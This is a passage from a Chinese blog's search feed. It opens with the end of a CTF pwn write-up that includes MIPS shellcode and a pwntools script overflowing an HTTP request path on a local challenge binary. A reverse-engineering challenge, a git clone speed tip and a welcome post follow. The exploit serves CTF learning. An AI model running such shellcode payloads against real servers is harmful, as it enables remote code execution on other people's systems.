class="string">"\x28\x05\xff\xff"</span>      <span class="comment">#  /* slti    a1,zero,-1   */</span></span><br><span class="line">shellcode += <span class="string">"\x24\x02\x0f\xab"</span>      <span class="comment">#  /* li      v0,4011      */</span></span><br><span class="line">shellcode += <span class="string">"\x01\x01\x01\x0c"</span>      <span class="comment">#  /* syscall 0x40404      */</span></span><br><span class="line"></span><br><span class="line">shellcode_addr = <span class="string">''</span></span><br><span class="line">shellcode_addr = <span class="string">"\x7f\xff\x6b\x50"</span>  <span class="comment">#  shellcode的地址</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/a'</span> + shellcode + <span class="string">'a'</span> * (<span class="number">253</span> - len(shellcode) - <span class="number">5</span>) + <span class="string">'/123'</span> + shellcode_addr</span><br><span class="line"></span><br><span class="line">http = <span class="string">'GET '</span> + payload + <span class="string">' HTTP/1.1'</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'127.0.0.1'</span>, <span class="number">1234</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">'r'</span>) <span class="comment"># gdb run</span></span><br><span class="line">r.recv()        <span class="comment"># start?</span></span><br><span class="line">r.send(<span class="string">'\n'</span>)</span><br><span class="line">r.sendline(http)</span><br><span class="line">r.recv()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>题目本身简单..保护全关, 但是麻烦的地方就是调试环境, 一开始用qemu共享库起, 报段错误, 无法运行</p><p>m4x师傅给了我一个docker: <a href="https://github.com/Inv0k3r/multiarch-docker">multiarch-docker</a></p><p>能运行了但是一调试就炸…最后没办法了才直接在虚拟机里跑, 装个gdb然后端口映射233</p><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><p>程序很简单, 对输入的64字节进行计算然后输出结果</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  const char *v3; // rdi</span><br><span class="line">  __int128 v5; // [rsp+0h] [rbp-48h]</span><br><span class="line">  __int128 v6; // [rsp+10h] [rbp-38h]</span><br><span class="line">  __int128 v7; // [rsp+20h] [rbp-28h]</span><br><span class="line">  __int128 v8; // [rsp+30h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  v5 = 0LL;</span><br><span class="line">  v6 = 0LL;</span><br><span class="line">  v7 = 0LL;</span><br><span class="line">  v8 = 0LL;</span><br><span class="line">  fgets((char *)&amp;v5, 64, stdin);</span><br><span class="line">  v3 = &quot;Correct&quot;;</span><br><span class="line">  if ( 3115122397540209627LL * (_QWORD)v5 != -8945977187951441533LL</span><br><span class="line">    &amp;&amp; 4414703129018815665LL * *((_QWORD *)&amp;v5 + 1) != 4916877443135797676LL</span><br><span class="line">    &amp;&amp; -3600163150705005919LL * (_QWORD)v6 != 7810089588917861348LL</span><br><span class="line">    &amp;&amp; 2848986016212807631LL * *((_QWORD *)&amp;v6 + 1) != 167648691539577515LL</span><br><span class="line">    &amp;&amp; -1642960843930225163LL * (_QWORD)v7 != 7205007458378757539LL</span><br><span class="line">    &amp;&amp; -1825322870425963839LL * *((_QWORD *)&amp;v7 + 1) != -4377928447117523719LL</span><br><span class="line">    &amp;&amp; 2026288208431064569LL * (_QWORD)v8 != 1464929445109676135LL</span><br><span class="line">    &amp;&amp; 7391496157776266721LL * *((_QWORD *)&amp;v8 + 1) != -2449767388115536590LL )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = &quot;Wrong&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  puts(v3);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>v5-8都是int128类型, 占用128 / 8 = 16字节, qword是8个字节</p><p>4个变量共64字节构成key, 然后每个变量又分别分成8个字节去计算</p><pre><code>3115122397540209627LL * (_QWORD)v5 != -8945977187951441533LL4414703129018815665LL * *((_QWORD *)&amp;v5 + 1) != 4916877443135797676LL-3600163150705005919LL * (_QWORD)v6 != 7810089588917861348LL2848986016212807631LL * *((_QWORD *)&amp;v6 + 1) != 167648691539577515LL-1642960843930225163LL * (_QWORD)v7 != 7205007458378757539LL-1825322870425963839LL * *((_QWORD *)&amp;v7 + 1) != -4377928447117523719LL2026288208431064569LL * (_QWORD)v8 != 1464929445109676135LL7391496157776266721LL * *((_QWORD *)&amp;v8 + 1) != -2449767388115536590LL</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ctf </tag>
            
            <tag> mips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何提高Git Clone的速度</title>
      <link href="/2019/01/18/%E5%A6%82%E4%BD%95%E6%8F%90%E9%AB%98git-clone%E7%9A%84%E9%80%9F%E5%BA%A6/"/>
      <url>/2019/01/18/%E5%A6%82%E4%BD%95%E6%8F%90%E9%AB%98git-clone%E7%9A%84%E9%80%9F%E5%BA%A6/</url>
      
        <content type="html"><![CDATA[<ol><li><p>用ssh</p></li><li><p>改host</p></li></ol><p>Linux下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mv /etc/host /etc/host_bak \</span><br><span class="line">vim /etc/host</span><br></pre></td></tr></table></figure><p>下面这些丢进去<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Github</span><br><span class="line">151.101.44.249 github.global.ssl.fastly.net</span><br><span class="line">192.30.253.113 github.com</span><br><span class="line"># The follow 3 line may cause Github access slowly</span><br><span class="line"># 103.245.222.133 assets-cdn.github.com</span><br><span class="line"># 23.235.47.133 assets-cdn.github.com</span><br><span class="line"># 203.208.39.104 assets-cdn.github.com</span><br><span class="line"># -------------------------------------------</span><br><span class="line">204.232.175.78 documentcloud.github.com</span><br><span class="line">204.232.175.94 gist.github.com</span><br><span class="line">107.21.116.220 help.github.com</span><br><span class="line">207.97.227.252 nodeload.github.com</span><br><span class="line">199.27.76.130 raw.github.com</span><br><span class="line">107.22.3.110 status.github.com</span><br><span class="line">204.232.175.78 training.github.com</span><br><span class="line">207.97.227.243 www.github.com</span><br><span class="line">185.31.16.184 github.global.ssl.fastly.net</span><br><span class="line">185.31.18.133 avatars0.githubusercontent.com</span><br><span class="line">185.31.19.133 avatars1.githubusercontent.com</span><br></pre></td></tr></table></figure></p><p>然后<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/etc/init.d/networking restart</span><br></pre></td></tr></table></figure></p><p>ok，速度拉满</p>]]></content>
      
      
      
        <tags>
            
            <tag> github </tag>
            
            <tag> 优化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2019/01/15/hello-world/"/>
      <url>/2019/01/15/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to my blog!</p><h1 id="修修改改博客终于搞起来了"><a href="#修修改改博客终于搞起来了" class="headerlink" title="修修改改博客终于搞起来了"></a>修修改改博客终于搞起来了</h1><p>从WordPress到hexo再到github+hexo</p><p>然后换了三五个主题</p><p>最终决定用这个仙人掌, 非常合我口味</p><p>同时也安利一下 <a href="https://probberechts.github.io/hexo-theme-cactus/">https://probberechts.github.io/hexo-theme-cactus/</a></p><p>404页面的小恐龙用的是这个 <a href="https://github.com/wayou/t-rex-runner">https://github.com/wayou/t-rex-runner</a></p><p>有时间准备给about me写个好看的js</p><p>然后emmmmmmmmmmmm</p><p>想试试把NES.css结合进来, 八像素风格真好看233</p>]]></content>
      
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
